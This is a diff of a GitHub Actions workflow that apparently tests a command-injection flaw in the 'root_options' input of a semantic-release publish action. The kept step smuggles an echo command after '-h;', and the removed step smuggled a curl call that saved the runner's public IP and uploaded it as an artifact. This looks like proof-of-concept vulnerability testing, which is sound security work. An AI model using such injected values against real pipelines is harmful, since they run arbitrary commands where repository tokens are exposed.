@@ -14,23 +14,11 @@ jobs:
       - name: checkout
         uses: actions/checkout@v4
 
-      - name: test injection 1
+      - name: test injection
         uses: python-semantic-release/publish-action@v9.21.1
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
           root_options: "-h; echo 'INJECTED COMMAND EXECUTED' > injected.txt; echo "
-
-      - name: test injection 2
-        uses: python-semantic-release/publish-action@v9.21.1
-        with:
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          root_options: "-h; curl https://ifconfig.me -o myip.txt; echo "
-      
-      - name: upload artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: public-ip
-          path: myip.txt
       
       - name: upload other artifact
         uses: actions/upload-artifact@v4
